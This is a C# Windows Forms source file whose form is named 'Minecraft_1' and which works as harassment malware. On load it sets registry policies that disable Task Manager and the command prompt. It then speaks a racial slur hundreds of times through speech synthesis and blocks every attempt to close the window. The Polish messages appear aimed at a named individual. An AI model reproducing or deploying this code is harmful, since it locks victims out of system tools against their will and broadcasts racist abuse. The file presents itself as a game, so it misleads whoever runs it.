using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech.Synthesis;
using Microsoft.Win32;

namespace Maupki.exe
{
    public partial class Minecraft_1 : Form
    {
        public Minecraft_1()
        {
            InitializeComponent();
        }

        private void Minecraft_1_Load(object sender, EventArgs e)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", "1");

            try
            {
                RegistryKey key2 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\System");
                key2.SetValue("DisableCMD", "2");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Jesteś Jędrzej", "Jestes Jędrzej", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            SpeechSynthesizer ss = new SpeechSynthesizer();
            for(int i = 0; i < 800; i++)
            {
                ss.Speak("Nigger Nigger Nigger Nigger Nigger Nigger");
            }
        }

        private void Minecraft_1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("Czemu chcesz mnie zabić kochanie :(");
        }
    }
}
